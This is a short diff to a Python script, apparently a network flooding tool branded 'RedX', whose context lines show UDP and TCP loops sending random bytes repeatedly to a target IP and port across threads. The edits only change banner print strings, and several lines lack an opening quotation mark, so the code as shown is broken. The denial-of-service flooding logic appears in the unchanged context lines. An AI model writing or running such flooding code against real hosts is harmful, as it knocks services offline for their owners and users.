@@ -40,9 +40,9 @@ def run():
                         addr = (str(ip),int(port))
                         for x in range(times):
                                 s.sendto(data,addr)
-                        print(\033[92m!! RedX Menyenggol ")
+                        print("\033[92m [*] RedX Menyenggol ")
                 except:
-                        print("\033[92m!!RedX IS HERE DUDE! ")
+                        print("\033[92m [!] RedX IS HERE DUDE! ")
 
 def run2():
         data = random._urandom(860)
@@ -54,10 +54,10 @@ def run2():
                         s.send(data)
                         for x in range(times):
                                 s.send(data)
-                        print(\033[92m!! RedX Menyenggol ")
+                        print(\033[92m [!] RedX Menyenggol ")
                 except:
                         s.close()
-                        print("\033[92m!! RedX IS HERE DUDE ")
+                        print("\033[92m [*] RedX IS HERE DUDE ")
 
 for y in range(threads):
         if choice == 'y':
